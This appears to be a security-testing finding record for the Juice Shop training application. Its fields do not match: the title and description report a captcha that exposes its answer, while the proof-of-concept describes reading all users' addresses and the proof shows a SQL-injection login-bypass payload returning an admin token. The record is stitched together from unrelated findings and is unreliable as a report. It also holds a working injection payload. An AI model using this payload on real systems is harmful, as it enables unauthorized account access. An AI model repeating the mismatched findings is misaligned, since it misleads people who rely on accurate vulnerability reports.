title: Weak Captcha - Answer Exposed in API Response
description: The captcha endpoint at /rest/captcha returns the answer in the response alongside the question, making the captcha completely ineffective as an anti-automation measure.
poc: GET /api/Addresss with admin JWT returns all users' addresses
proof: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
